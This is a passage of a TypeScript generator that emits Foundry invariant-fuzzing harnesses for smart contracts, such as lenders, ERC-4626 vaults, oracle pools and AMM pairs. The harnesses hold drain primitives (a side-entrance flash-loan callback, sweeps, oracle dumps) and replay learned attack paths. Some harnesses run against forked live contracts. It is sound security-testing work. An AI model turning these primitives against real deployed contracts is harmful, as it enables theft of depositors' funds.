        '        console2.log("[GEN_PATH] sweep", amt);',
        "        try target.transfer(address(this), amt) {} catch {}",
        "    }",
      ].join("\n")
    );
  }

  // Victim honest exit (gives the credit/roundtrip invariants a resolution path).
  const victimExit: string[] = [];
  if (shape === "lender-native") {
    const w0 = prims.find((f) => sigOf(f) === "withdraw()");
    // 1-arg withdraw (WETH-style withdraw(uint256)) — without this arm the
    // fallback emitted withdraw() against a 1-arg ABI (Error 6160, whole-tree
    // poison on every such target).
    const w1 = prims.find((f) => /^withdraw/.test(f.name) && f.params.length === 1 && f.params[0]!.type.startsWith("uint"));
    const w2 = prims.find((f) => /^withdraw/.test(f.name) && f.params.length === 2 && f.params[0]!.type.startsWith("uint"));
    victimExit.push(
      [
        "    /// The victim's one honest exit — after this, credit invariants are settled.",
        "    function fuzz_victimExit() external {",
        "        if (victimExited || !victimEntered) return;",
        "        vm.prank(victim);",
        w0
          ? "        try target.withdraw() { victimGotNative = victimSeed; victimExited = true; } catch {}"
          : w1
            ? "        try target.withdraw(victimSeed) { victimGotNative = victimSeed; victimExited = true; } catch {}"
            : w2
              ? "        try target.withdraw(victimSeed, payable(victim)) { victimGotNative = victimSeed; victimExited = true; } catch {}"
              : "        // target exposes no 0/1/2-arg withdraw — no honest exit path on this surface",
        "    }",
      ].join("\n")
    );
  } else if (shape === "erc4626") {
    // The redeem call must follow the TARGET'S ABI: some vaults deploy 2-param
    // redeem(uint256,address) variants (and the old hardcoded 3-arg call also
    // broke on those — error 6160, whole-tree poison). Withdraw fallback covers
    // shapes that expose withdraw(uint256,address,address) instead.
    const red3 = prims.find((f) => sigOf(f) === "redeem(uint256,address,address)");
    const red2 = prims.find((f) => sigOf(f) === "redeem(uint256,address)");
    const wd3 = prims.find((f) => sigOf(f) === "withdraw(uint256,address,address)");
    const redeemLines: string[] = [];
    if (red3 || !red2) {
      redeemLines.push(
        "        try target.redeem(sh, victim, victim) {",
        "            victimGotToken = assetToken.balanceOf(victim) - before;",
        "            victimExited = true;",
        "        } catch {}",
      );
    } else if (wd3) {
      redeemLines.push(
        "        try target.withdraw(sh, victim, victim) {",
        "            victimGotToken = assetToken.balanceOf(victim) - before;",
        "            victimExited = true;",
        "        } catch {}",
      );
    } else {
      redeemLines.push(
        "        try target.redeem(sh, victim) {",
        "            victimGotToken = assetToken.balanceOf(victim) - before;",
        "            victimExited = true;",
        "        } catch {}",
      );
    }
    victimExit.push(
      [
        "    /// The victim's one honest exit — redeems everything and records proceeds.",
        "    /// (No return binding: measured from the victim's token balance.)",
        "    function fuzz_victimExit() external {",
        "        if (victimExited || !victimEntered) return;",
        "        uint256 sh = target.balanceOf(victim);",
        "        if (sh == 0) { victimGotToken = 0; victimExited = true; return; }",
        "        uint256 before = assetToken.balanceOf(victim);",
        "        vm.prank(victim);",
        ...redeemLines,
        "    }",
      ].join("\n")
    );
  }

  // Victim deposit as a FUZZER-ORDERED primitive. Ordering is the attack
  // surface (donate-then-deposit vs deposit-then-donate IS the 4626 inflation
  // bug), so it must never be fixed in setUp.
  if (shape === "erc4626" && depUint) {
    const depArgs = depUint.params.map((p, i) => (i === depositAmountArgIdx ? "amt" : p.type === "address" ? "victim" : "0")).join(", ");
    victimExit.push(
      [
        "    /// The victim's honest entry — the fuzzer chooses WHEN (before or after",
        "    /// donations/other flows). After this the roundtrip invariant arms.",
        `    function fuzz_victimDeposits(uint256 s0) external {`,
        "        if (victimEntered || victimTokenBalance == 0) return;",
        "        uint256 amt = bound(s0, 1, victimTokenBalance);",
        '        console2.log("[GEN_PATH] victimDeposits", amt);',
        "        vm.startPrank(victim);",
        "        assetToken.approve(address(target), type(uint256).max);",
        `        try target.${depUint.name}(${depArgs}) {`,
        "            victimSeedToken = amt;",
        "            victimEntered = true;",
        "        } catch {}",
        "        vm.stopPrank();",
        "    }",
      ].join("\n")
    );
  } else if (shape === "lender-native" && dep0) {
    victimExit.push(
      [
        "    /// The victim's honest entry — the fuzzer chooses WHEN. After this the",
        "    /// credit invariant arms.",
        "    function fuzz_victimDeposits(uint256 s0) external {",
        "        s0; // amount fixed: the victim deposits its whole seed",
        "        if (victimEntered) return;",
        '        console2.log("[GEN_PATH] victimDeposits", uint256(1));',
        "        vm.deal(victim, 10e18);",
        "        vm.prank(victim);",
        `        try target.${dep0.name}{value: 10e18}() {`,
        "            victimSeed = 10e18;",
        "            victimEntered = true;",
        "        } catch {}",
        "    }",
      ].join("\n")
    );
  }

  // LEARNED ATTACK REPLAY: a proven violating path from a previous discovery
  // on this shape becomes ONE deterministic primitive. Every step is bounded
  // by its own handler — on an honest target the steps no-op and every
  // invariant still holds; on a buggy same-shape target the violation is
  // reached in fuzz run 1 instead of whenever random search stumbles on it.
  const learnedReplay: string[] = [];
  if (learnedSteps.length > 0) {
    // arity map: generated ABI handlers + every catalog/victim primitive
    const arity = new Map<string, number>();
    for (const f of prims) arity.set(f.name, f.params.length);
    const catalog: Array<[string, number]> = [
      ["donateNative", 1], ["seedSupply1Wei", 0], ["donateToken", 1],
      ["setCallbackDeposits", 1], ["arbCall", 2], ["sweep", 1],
      ["dumpToken", 1], ["borrowNative", 2], ["listItems", 1], ["buyBatch", 2],
      ["victimDeposits", 1], ["victimExit", 0],
    ];
    for (const [n, a] of catalog) if (!arity.has(n)) arity.set(n, a);
    const calls: string[] = [];
    for (let i = 0; i < learnedSteps.length; i++) {
      const step = learnedSteps[i]!;
      const a = arity.get(step);
      if (a === undefined) {
        calls.push(`        // step ${i + 1}/${learnedSteps.length} "${step}": not fuzzable in this harness — skipped`);
        continue;
      }
      const seeds = Array.from({ length: a }, (_, k) => `s0 + ${i * 2 + k}`).join(", ");
      calls.push(`        fuzz_${step}(${seeds}); // step ${i + 1}/${learnedSteps.length}`);
    }
    if (calls.length > 0) {
      learnedReplay.push(
        [
          "    /// LEARNED ATTACK REPLAY (reports/genlearn.json): proven violating path",
          "    /// for this shape, replayed deterministically. Honest targets no-op",
          "    /// through these steps; a buggy same-shape target violates in run 1.",
          "    function fuzz_replayLearned(uint256 s0) external {",
          ...calls,
          "    }",
        ].join("\n")
      );
    }
  }

  // ---- invariants (the catalog) ----
  const invariants: string[] = [];
  invariants.push(
    [
      "    /// UNIVERSAL: the searcher's native balance never exceeds what it held",
      "    /// after setup. Balance-based (not event-based): honest flash loans net",
      "    /// to zero; any leftover loaned native IS the theft. Catches side-entrance,",
      "    /// credit confusion, forced fees, and overcredit drains.",
      "    function invariant_GEN_native_conservation() public {",
      ...(shape === "oracle-spot"
        ? [
            "        // ORACLE-SPOT: native alone is not conservation — an honest dump of the",
            "        // setup token stash converts tokens to native 1:1 in value. Guard",
            "        // native + tokens-at-setup-price instead: the honest-wealth baseline.",
            "        uint256 ethValueOfTokens = assetToken.balanceOf(address(this)) * initEthPerToken / 1e18;",
            "        assertLe(address(this).balance + ethValueOfTokens, initialNative + searcherStaked + initTokenWealth,",
            '            "GENINV-native-conservation: searcher wealth (native + tokens at honest price) grew beyond setup bounds (oracle played)");',
          ]
        : [
            "        // The searcher's own honest stake is recoverable — profit above",
            "        // stake + setup balance is the theft (balance-based accounting).",
            "        assertLe(address(this).balance, initialNative + searcherStaked,",
            '            "GENINV-native-conservation: searcher ended with more native than stake + setup balance");',
          ]),
      "    }",
    ].join("\n")
  );
  if (shape === "lender-native") {
    invariants.push(
      [
        "    /// LENDER: a third-party victim's deposit stays fully recoverable —",
        "    /// reentrancy drains and credit-confusion drains break this.",
        "    function invariant_GEN_victim_credit() public {",
        "        if (!victimEntered) return;",
        "        if (victimExited) {",
        "            assertGe(victimGotNative, victimSeed,",
        '                "GENINV-victim-recovery: victim exited with less than they deposited");',
        "        } else {",
        "            assertGe(address(target).balance, victimSeed,",
        '                "GENINV-victim-credit: target balance fell below the victim\'s untouched deposit");',
        "        }",
        "    }",
      ].join("\n")
    );
  }
  if (shape === "lender-arbitrary-call") {
    invariants.push(
      [
        "    /// LENDER SOLVENCY (arbitrary-call variant): the pool's parked asset seed",
        "    /// is never extractable. approve-then-sweep via the pool's own flash-loan",
        "        /// call surface pulls it below the seed.",
        "    function invariant_GEN_target_solvency() public {",
        "        assertGe(assetToken.balanceOf(address(target)), targetSeedToken,",
        '            "GENINV-target-solvency: target asset balance fell below the parked seed (drain)");',
        "    }",
      ].join("\n")
    );
  }
  if (shape === "marketplace-batch") {
    invariants.push(
      [
        "    /// NATIVE SOLVENCY: the marketplace's native float (seller escrow) is",
        "    /// never extractable by the searcher. Honest purchases pay real price.",
        "    function invariant_GEN_native_solvency() public {",
        "        assertGe(address(target).balance, poolSeedNative * 99 / 100,",
        '            "GENINV-native-solvency: target native float fell below its seed (drain)");',
        "    }",
      ].join("\n")
    );
  }
  if (shape === "oracle-spot") {
    invariants.push(
      [
        "    /// ORACLE-SPOT: the pool's total VALUE (tokens at the SETUP oracle price",
        "        /// plus native) is never extractable. Honest borrows pay collateral >=",
        "        /// the tokens' value at the CURRENT price — at the setup price that is",
        "        /// full value. A played (dumped) oracle lets the whole float go for",
        "        /// almost nothing: the pool's value drops — that IS the bug class.",
        "    function invariant_GEN_target_solvency() public {",
        "        uint256 poolValue = assetToken.balanceOf(address(target)) * initEthPerToken / 1e18 + address(target).balance;",
        "        assertGe(poolValue, initPoolValue * 99 / 100,",
        '            "GENINV-target-solvency: pool value fell below its setup baseline (oracle-played drain)");',
        "    }",
      ].join("\n")
    );
  }
  if (needsAsset && shape === "lender-asset") {
    invariants.push(
      [
        "    /// LENDER SOLVENCY: the asset seed parked in the target at setup (the",
        "    /// depositors' funds) is never extractable — honest flash loans restore",
        "    /// the balance before returning; approve-then-sweep / arbitrary-call",
        "    /// drains pull it below the seed.",
        "    function invariant_GEN_target_solvency() public {",
        "        assertGe(assetToken.balanceOf(address(target)), targetSeedToken,",
        '            "GENINV-target-solvency: target asset balance fell below the parked seed (drain)");',
        "    }",
      ].join("\n")
    );
  }
  if (shape === "erc4626") {
    invariants.push(
      [
        "    /// ERC-4626: a victim's position always redeems for >= their deposit (99%",
        "    /// tolerance covers legitimate fee/rounding); zero shares minted on deposit",
        "    /// is an immediate violation (first-depositor inflation).",
        "    function invariant_GEN_4626_roundtrip() public {",
        "        if (!victimEntered) return;",
        "        if (victimExited) {",
        "            assertGe(victimGotToken, (victimSeedToken * 99) / 100,",
        '                "GENINV-4626-roundtrip: victim redeemed less than deposited");',
        "            return;",
        "        }",
        "        uint256 sh = target.balanceOf(victim);",
        '        assertTrue(sh > 0, "GENINV-4626-roundtrip: victim deposited but received zero shares");',
        "        uint256 supply = target.totalSupply();",
        "        if (supply == 0) return;",
        "        uint256 victimAssets = (sh * assetToken.balanceOf(address(target))) / supply;",
        "        assertGe(victimAssets, (victimSeedToken * 99) / 100,",
        '            "GENINV-4626-roundtrip: victim share of vault assets fell below deposit");',
        "    }",
      ].join("\n")
    );
  }
  if (shape === "token") {
    invariants.push(
      [
        "    /// TOKEN: totalSupply only grows by mints the harness itself performed.",
        "    /// Any other growth path is an unauthorized-mint surface.",
        "    function invariant_GEN_supply_tracked() public {",
        "        assertLe(target.totalSupply(), initialSupply + trackedMints,",
        '            "GENINV-supply: totalSupply grew beyond tracked mints (unauthorized mint path)");',
        "    }",
      ].join("\n")
    );
  }

  // ---- setup ----
  const setup: string[] = [];
  if (isAddress) {
    setup.push(`        target = ITarget(${targetAddr});`);
    if (shape === "erc4626") {
      setup.push(
        "        // Live token resolved via asset(); typed as ERC20Mintable for convenience —",
        "        // only standard approve/transfer/balanceOf are used on it.",
        `        try ITarget(${targetAddr}).asset() returns (address a) { assetToken = ERC20Mintable(a); } catch { return; }`,
        "        deal(address(assetToken), victim, 300e18);",
        "        victimTokenBalance = 300e18;",
        "        // Victim does NOT deposit here: the fuzzer owns donate-vs-deposit order.",
        "        initialSupply = target.totalSupply();"
      );
    } else if (shape === "lender-native") {
      setup.push(
        "        // Address mode: victim deposits are fuzzer-ordered (see primitives).",
        "        victimEntered = false;",
        dep0
          ? "        try target.deposit{value: 100e18}() { searcherStaked = 100e18; } catch {} // searcher stake: liquidity + honest credit"
          : ""
      );
    } else if (shape === "lender-asset") {
      // Asset cannot be discovered generically from an address yet (no ctor
      // introspection on-chain); an asset-probe is future work. Honest skip.
      try { recordDeadend(shape, "address-mode lender-asset: the pool's asset token cannot be discovered without constructor introspection"); } catch {}
      return null;
    } else if (shape === "oracle-spot") {
      // The live pool's pair is its own immutable — moving ITS price needs a
      // swap on THAT pair's live token, which generic setup cannot bootstrap.
      // Honest skip (fork-mode oracle probing is future work).
      try { recordDeadend(shape, "address-mode oracle-spot: the pool's AMM pair is immutable and its live token cannot be bootstrapped generically"); } catch {}
      return null;
    } else if (shape === "marketplace-batch") {
      // Listing state is target-specific on a live contract — honest skip.
      try { recordDeadend(shape, "address-mode marketplace-batch: listing state is target-specific and cannot be seeded generically"); } catch {}
      return null;
    } else {
      setup.push("        initialSupply = target.totalSupply();");
    }
  } else {
    // source mode — deploy. The asset token must exist BEFORE the target when
    // the constructor wants one.
    if (needsAsset) setup.push('        assetToken = new ERC20Mintable("GEN", "GEN");');
    if (shape === "oracle-spot") {
      setup.push(
        "        // AMM pair backs the pool's spot oracle: create it, then fund it so the",
        "        // oracle starts at an honest price (the fuzzer then owns any dump).",
        '        UniswapV1Factory f = new UniswapV1Factory();',
        "        pair = IUniswapV1Like(f.createPair(address(assetToken)));",
        "        assetToken.mint(address(this), 200e18);",
        "        assetToken.approve(address(pair), type(uint256).max);",
        "        vm.deal(address(this), 1_000e18);",
        "        pair.addLiquidity{value: 100e18}(0, 100e18, block.timestamp + 1);",
        "        poolSeedNative = 10e18; // the pool's own lending float (what borrow() drains)"
      );
    }
    if (shape === "marketplace-batch") setup.push('        nftToken = new ERC721("GEN NFT", "GNFT");');
    const ctorArgs: string[] = [];
    for (const p of abi.constructorParams) {
      let a: string | null;
      if (shape === "oracle-spot" && /pair|exchange|amm|market/i.test(p.name)) a = "address(pair)";
      else if (shape === "marketplace-batch" && /nft|token/i.test(p.name) === false && p.type === "address") a = null;
      else a = ctorArg(p, needsAsset);
      if (shape === "marketplace-batch" && /nft/i.test(p.name)) a = "address(nftToken)";
      if (a === null) return null; // constructor we cannot synthesize — honest skip
      ctorArgs.push(a);
    }
    setup.push(
      `        target = ITarget(address(new ${deployNameForEmit}(${ctorArgs.join(", ")})));`
    );
    if (shape === "erc4626") {
      setup.push(
        "        assetToken.mint(address(this), 2_000e18);",
        "        assetToken.mint(victim, 500e18);",
        "        victimTokenBalance = 500e18;",
        "        // Victim does NOT deposit here: donate-then-deposit vs deposit-then-",
        "        // donate ordering is the attack surface — the fuzzer owns the order.",
        "        initialSupply = target.totalSupply();"
      );
    } else if (shape === "lender-native") {
      setup.push(
        "        // Victim does NOT deposit here: when the deposit happens (before or",
        "        // after searcher flows) is the fuzzer's choice — credit must survive",
        "        // any ordering.",
        "        victimEntered = false;",
        dep0
          ? "        // The searcher seeds the pool with its OWN stake: real credit, real"
          : "",
        dep0
          ? "        // liquidity — credit-confusion then shows up as net extraction."
          : "",
        dep0 ? "        target.deposit{value: 100e18}();\n        searcherStaked = 100e18;" : ""
      );
    } else if (shape === "lender-asset") {
      setup.push(
        "        // Depositors' funds parked in the pool — what the solvency invariant guards.",
        "        assetToken.mint(address(target), 1_000e18);",
        "        targetSeedToken = 1_000e18;",
        "        assetToken.mint(address(this), 1_000e18); // searcher working capital",
        depUint
          ? [
              "        // Probe-deposit as the searcher; the seed grows by the MEASURED token",
              "        // delta (a deposit() that transferFroms — or reverts — must not",
              "        // credit tokens that never moved, or solvency false-positives).",
              "        assetToken.approve(address(target), type(uint256).max);",
              "        {",
              "            uint256 balBefore = assetToken.balanceOf(address(target));",
              `            try target.${depUint.name}(300e18${depUint.params.length > 1 ? depUint.params.slice(1).map((p) => (p.type === "address" ? ", victim" : ", 0")).join("") : ""}) {} catch {}`,
              "            targetSeedToken += assetToken.balanceOf(address(target)) - balBefore;",
              "        }",
            ].join("\n")
          : "        // no deposit(uint256) surface — seed is the parked pool balance only"
      );
    } else if (shape === "lender-arbitrary-call") {
      setup.push(
        "        // Depositors' funds parked in the pool — what solvency guards.",
        "        assetToken.mint(address(target), 1_000e18);",
        "        targetSeedToken = 1_000e18;",
        "        assetToken.mint(address(this), 1_000e18); // searcher working capital"
      );
    } else if (shape === "oracle-spot") {
      setup.push(
        "        // Pool float: what borrow() pays out. The oracle price is what makes",
        "        // the required collateral cheap — the fuzzer owns any dump that moves it.",
        "        vm.deal(address(target), 10e18);",
        "        assetToken.mint(address(target), 1_000e18);",
        "        poolSeedNative = 10e18;",
        "        targetSeedToken = 1_000e18;",
        "        assetToken.mint(address(this), 100e18); // dump ammunition"
      );
    } else if (shape === "marketplace-batch") {
      setup.push(
        "        // Seller lists NFTs; the pool holds a native float (marketplace escrow —",
        "        // overcredit drains it). The fuzzer owns how the batch is paid for.",
        "        seller = makeAddr(\"seller\");",
        "        vm.deal(address(target), 10e18);",
        "        poolSeedNative = 10e18;"
      );
    } else {
      // token
      setup.push(
        "        try target.mint(address(this), 1_000e18) { trackedMints += 1_000e18; } catch {}",
        "        try target.transfer(victim, 100e18) {} catch {}",
        "        initialSupply = target.totalSupply();"
      );
    }
  }
  // Record the conservation baseline LAST — after every setup flow.
  // (oracle-spot: the honest price and token wealth must be captured after ALL
  // mints — the dump ammo is searcher wealth and belongs in the baseline.)
  if (shape === "oracle-spot") {
    setup.push(
      "        initEthPerToken = address(pair).balance * 10 ** 18 / pair.tokenPool(); // honest oracle price",        "        initTokenWealth = assetToken.balanceOf(address(this)) * initEthPerToken / 1e18; // dump ammo valued honestly",
      "        initPoolValue = targetSeedToken * initEthPerToken / 1e18 + poolSeedNative; // pool value baseline"
    );
  }
  setup.push("        initialNative = address(this).balance;");

  // Fuzz caller-scope hygiene: by default Foundry's invariant fuzzer uses EVERY
  // deployed contract as both a call target and a message sender. Left open, it
  // can make the TARGET act (e.g. the bridge transferring its own treasury to a
  // random address) — a capability no real attacker has — and produces false
  // positives. Pin callers to the test contract, targets to the target's own
  // entrypoints, and exclude helper contracts from the target pool.
  setup.push(
    "        // Scope the fuzzer: harness handlers + the target's own entrypoints",
    "        // are the only call targets; helpers (asset token) are excluded so the",
    "        // fuzzer can never make them ACT (a deployed contract is otherwise a",
    "        // valid msg.sender — e.g. a bridge transferring its own treasury).",
    "        targetContract(address(this));",
    "        targetContract(address(target));",
    `        bytes4[] memory genSels = new bytes4[](${eps.length});`,
    ...eps.map((f, i) => `        genSels[${i}] = bytes4(keccak256("${sigOf(f)}"));`),
    "        targetSelector(FuzzSelector({addr: address(target), selectors: genSels}));",
    ...(needsAsset ? ["        excludeContract(address(assetToken));"] : [])
  );

  // flash-loan callback (source mode only — address mode cannot know the shape)
  let callbackBlock = "";
  if (callbackStyle && !isAddress) {
    callbackBlock = `
    // ---- flash-loan callback: the SIDE ENTRANCE is a choice the fuzzer makes ----
    // Loaned native is the POOL's money: it is never counted as searcher
    // deposits. Booking it as credit (callbackDeposits) then withdrawing is
    // exactly the side-entrance drain — the balance invariant sees the theft.

    function execute() external payable {
        if (msg.sender == address(target) && callbackDeposits) {
            try ITarget(address(target)).deposit{value: msg.value}() {} catch {}
        }
    }

    function receiveEther(uint256) external payable {
        if (msg.sender == address(target) && callbackDeposits) {
            try ITarget(address(target)).deposit{value: msg.value}() {} catch {}
        }
    }
`;
  }

  // ---- assemble ----
  // Normalize the challenge source path to project-root-relative (strip any
  // absolute prefix and leading ./) so the emitted import is cwd-independent.
  const rawSrcPath = input.sourcePaths?.[0] ?? "";
  const relSrcPath = rawSrcPath.includes("src/challenges/")
    ? "src/challenges/" + rawSrcPath.slice(rawSrcPath.indexOf("src/challenges/") + "src/challenges/".length)
    : rawSrcPath.replace(/^\.\//, "");
  // Resolved by the source-mode guard above: the contract the emitted file
  // imports AND deploys. Address-mode never uses it.
  const deployImport = !isAddress && relSrcPath
    ? `import {${deployNameForEmit}} from "../../${relSrcPath}";`
    : "";
  // Hoisted so the big source template stays free of nested template
  // literals (Node's TS stripper chokes on them).
  const learnedHeader = learnedNote ? `// Learned priors: ${learnedNote}.` : "";
  const src = `// SPDX-License-Identifier: MIT
// AGENT-GENERATED generic invariant harness — ${input.challengeName}
// Engine: agent/src/genharness.ts (universal property catalog, shape "${shape}").
${learnedHeader}
// No hand-written exploit: the fuzzer orders bounded PRIMITIVES from the
// target's own callable surface; a violated invariant IS the discovered bug.
// Local-only: forge test, no broadcast. Generated ${new Date().toISOString()}.
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {ERC20Mintable} from "../../src/tokens/ERC20Mintable.sol";
import {ERC721} from "../../src/tokens/ERC721.sol";
import {UniswapV1Factory} from "../../src/uniswap/UniswapV1.sol";

interface IUniswapV1Like {
    function addLiquidity(uint256,uint256,uint256) external payable returns (uint256);
    function tokenToEthSwapInput(uint256,uint256,uint256) external returns (uint256);
    function tokenPool() external view returns (uint256);
}

interface IUniswapV1FactoryLike {
    function createPair(address) external returns (address);
}
${deployImport ? deployImport + "\n" : ""}
interface ITarget {
${[...iface.values()].flat().map((d) => `    ${d}`).join("\n")}
}

contract ${contractName} is Test {
    ITarget target;
    ERC20Mintable assetToken; // tracked asset (deployed in source mode; via asset() in address mode)
    address internal victim;

    // conservation baseline (balance-based — recorded at the end of setUp)
    uint256 initialNative;
    uint256 searcherStaked; // searcher's own honest native stake in the target

    // victim accounting (credit/roundtrip invariants)
    bool victimEntered;
    bool victimExited;
    uint256 victimSeed;
    uint256 victimSeedToken;
    uint256 victimGotNative;
    uint256 victimGotToken;
    uint256 victimTokenBalance; // the victim's working token capital (0 for native shapes)

    // lender solvency (asset parked in the target at setup)
    uint256 targetSeedToken;
    uint256 poolSeedNative; // native seed parked in the target (oracle/marketplace shapes)
    address internal seller; // marketplace listing party
    IUniswapV1Like pair; // AMM pair backing the spot oracle (oracle-spot shape)
    uint256 initEthPerToken; // setup oracle price (wei of ETH per 1e18 token) — the honest valuation basis
    uint256 initTokenWealth; // searcher's setup token stash, valued at the honest price (oracle-spot baseline)
    uint256 initPoolValue; // pool's total VALUE at setup (tokens at honest price + native) — the solvency baseline
    ERC721 internal nftToken; // marketplace shape's NFT

    // supply accounting (token shape)
    uint256 initialSupply;
    uint256 trackedMints;

    bool callbackDeposits; // side-entrance primitive switch

    function setUp() public {
        victim = makeAddr("victim");
        vm.deal(address(this), 200e18);

${setup.join("\n")}
    }

    receive() external payable {}

    // ---------- PRIMITIVES (generated from the parsed ABI) ----------
${skippedFns.length > 0 ? `\n    // Skipped (unsupported signatures, honestly excluded): ${skippedFns.join("; ")}\n` : ""}
${primLines.join("\n\n")}

${victimExit.join("\n\n")}
${callbackBlock}
${learnedReplay.join("\n\n")}
    // ---------- UNIVERSAL INVARIANTS (the catalog) ----------

${invariants.join("\n\n")}
}
`;
  // sanity: balanced braces in generated source
  const open = (src.match(/{/g) ?? []).length;
  const close = (src.match(/}/g) ?? []).length;
  if (open !== close) return null; // codegen bug — refuse to emit

  mkdirSync(AGENT_TEST_DIR, { recursive: true });
  const filePath = join(AGENT_TEST_DIR, `${contractName}.t.sol`);
  writeFileSync(filePath, sanitizeSoliditySource(src));
  return { contractName, filePath, shape, skippedFns };
}

/** The lab challenge contract's own name (best-effort from the input name). */
function contractTargetName(challengeName: string): string {
  const name = challengeName.replace(/[^A-Za-z0-9_]/g, "");
  return name.length > 0 ? name : "Target";
}

// ===================================================================
// AMM v2 pair generator (address-mode) — the fleet's biggest live class.
// ===================================================================
// A constant-product pair is not a lender: its attack surface is PRICE, not
// credit. The universal property is K-conservation around honest flows:
// reserves can only move by (a) token transfers anyone can observe and
// (b) the invariant product itself. The fuzzer orders price-moving primitives
// (swap, sync, skim, donate-token, fee-config) and the invariants catch:
//   - skim/sweep paths that pay out more reserves than donated (drain),
//   - sync() that books phantom reserves (overcredit),
//   - a k that GROWS without a matching donation (fee-math confusion),
//   - K-reserve drift the pair cannot account for from observed transfers.
//
// Address-mode only: a live pair is never deployed from source (its factory,
// token0/token1 and fee configuration are immutable on-chain facts).

function buildAmmHarness(input: HarnessInput, variantIdx: number): BuiltHarness | null {
  if (input.mode !== "address" || !input.bindAddress) {
    try { recordDeadend("amm-v2", "source-mode AMM harness is not implemented — live pairs are address-bound"); } catch {}
    return null;
  }
  const source = input.sources.join("\n\n");
  const abi = parseSolidityAbi(source);
  const fns = abi.functions;
  const pick = (re: RegExp): string | null => fns.find((f) => re.test(f.name))?.name ?? null;
  const t0 = pick(/^token0$/) ?? (abi.publicVars.some((v) => v.name === "token0") ? "token0" : null);
  const t1 = pick(/^token1$/) ?? (abi.publicVars.some((v) => v.name === "token1") ? "token1" : null);
  const res = pick(/^getReserves$/);
  const swap = pick(/^swap$/);
  const sync = pick(/^sync$/);
  const skim = pick(/^skim$/);

  // The universal minimum: token0/token1 + getReserves. Without reserves the
  // invariants have nothing to assert against. (Bytecode-only forks parse
  // nothing — those need the ABI-from-bytecode path before this shape helps.)
  if (!t0 || !t1 || !res) {
    try { recordDeadend("amm-v2", "pair surface incomplete: token0/token1/getReserves missing from parsed source"); } catch {}
    return null;
  }

  const pairAddr = toChecksumAddress(input.bindAddress);
  const nameBase = `GenAmm_${pairAddr.replace(/^0x/, "").slice(0, 10)}`.replace(/[^A-Za-z0-9_]/g, "_");
  const contractName = `${nameBase}_v${variantIdx}`;

  // Emit ONLY the primitives the pair actually exposes (honest subsetting).
  const primBlock: string[] = [];
  if (swap) {
    primBlock.push(
      [
        "    /// Fuzzer-ordered swap: direction + size + min-out, self-accounted.",
        "        /// A broken fee/rounding path pays out more than the pool's real",
        "        /// price allows — the accounting helper records it as free inflow.",
        `    function fuzz_swap(uint256 s0, uint256 s1, uint256 s2) external {`,
        "        bool dir = s0 % 2 == 0;",
        "        address tokenIn = dir ? token0 : token1;",
        "        uint256 amtIn = bound(s1, 0, IERC20Minimal(tokenIn).balanceOf(address(this)) / 2);",
        "        uint256 minOut = bound(s2, 0, amtIn);",
        "        if (amtIn == 0) return;",
        '        console2.log("[GEN_PATH] swap", amtIn);',
        "        IERC20Minimal(tokenIn).approve(address(target), type(uint256).max);",
        "        _account();",
        `        try target.${swap}(amtIn, minOut, address(this), "") {} catch {}`,
        "        _account();",
        "    }",
      ].join("\n")
    );
  }
  if (sync) {
    primBlock.push(
      [
        "    /// Resync reserves from token balances — after a donation this is the",
        "        /// honest fee accrual; a buggy sync books phantom reserves.",
        `    function fuzz_sync() external {`,
        '        console2.log("[GEN_PATH] sync");',
        `        try target.${sync}() {} catch {}`,
        "    }",
      ].join("\n")
    );
  }
  if (skim) {
    primBlock.push(
      [
        "    /// Pay the excess to the caller. On an honest pair the excess equals",
        "        /// exactly what donations added — more than that IS the drain.",
        `    function fuzz_skim(uint256 s0) external {`,
        "        s0;",
        '        console2.log("[GEN_PATH] skim");',
        "        _account();",
        `        try target.${skim}(address(this)) {} catch {}`,
        "        _account();",
        "    }",
      ].join("\n")
    );
  }
  primBlock.push(
    [
      "    /// Catalog primitive: donate tokens straight to the pair (no LP claim).",
      "        /// Sets up the skim/fee-accounting windows the other primitives exploit.",
      "    function fuzz_donateToken(uint256 s0, uint256 s1) external {",
      "        bool dir = s0 % 2 == 0;",
      "        address tokenIn = dir ? token0 : token1;",
      "        uint256 amt = bound(s1, 0, IERC20Minimal(tokenIn).balanceOf(address(this)) / 2);",
      "        if (amt == 0) return;",
      '        console2.log("[GEN_PATH] donateToken", amt);',
      "        _account();",
      "        IERC20Minimal(tokenIn).transfer(address(target), amt);",
      "        _account();",
      "    }",
    ].join("\n")
  );

  // Hoisted so the source template stays free of nested template literals
  // (Node's TS stripper chokes on them). The swap iface declares its dynamic
  // param with calldata (6651) — UNI_V2-style swap(uint256,uint256,address,bytes)
  // is the canonical shape the generator emits; pairs deviating from it are
  // exercised through sync/skim/donate only (honest subsetting).
  const ifaceSync = sync ? `    function ${sync}() external;\n` : "";
  const ifaceSkim = skim ? `    function ${skim}(address) external;\n` : "";
  const ifaceSwap = swap ? `    function ${swap}(uint256,uint256,address,bytes calldata) external;\n` : "";
  const genDate = new Date().toISOString();
  const src = `// SPDX-License-Identifier: MIT
// AGENT-GENERATED AMM-v2 invariant harness — ${pairAddr}
// Engine: agent/src/genharness.ts (amm-v2 generator, reserve-conservation catalog).
// No hand-written exploit: the fuzzer orders bounded PRICE primitives over the
// live pair; a violated invariant IS the discovered bug.
// Local-only: forge test against the forked pair; no broadcast. Generated ${genDate}.
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

interface IERC20Minimal {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IPair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112, uint112, uint32);
${ifaceSync}${ifaceSkim}${ifaceSwap}}

contract ${contractName} is Test {
    IPair target;
    address token0;
    address token1;

    // Self-accounting: every harness token flow is attributed by measuring the
    // harness's own balances around each action. seedN is what the harness was
    // dealt; donatedN leaves; sweptN arrives. The invariants assert the
    // harness can never end up with MORE than its seed minus donations plus
    // measured inflows — any unexplained gain is the drain.
    uint256 seed0;
    uint256 seed1;
    uint256 donated0;
    uint256 donated1;
    uint256 swept0;
    uint256 swept1;

    function setUp() public {
        target = IPair(${pairAddr});
        token0 = target.token0();
        token1 = target.token1();

        (uint112 r0, uint112 r1, ) = target.getReserves();
        require(r0 > 0 && r1 > 0, "empty pair — nothing to conserve");

        // Working capital on both tokens (raw units, decimal-agnostic): the
        // fuzzer can then donate/swap in either direction.
        deal(token0, address(this), 1e12);
        deal(token1, address(this), 1e12);
        seed0 = 1e12;
        seed1 = 1e12;

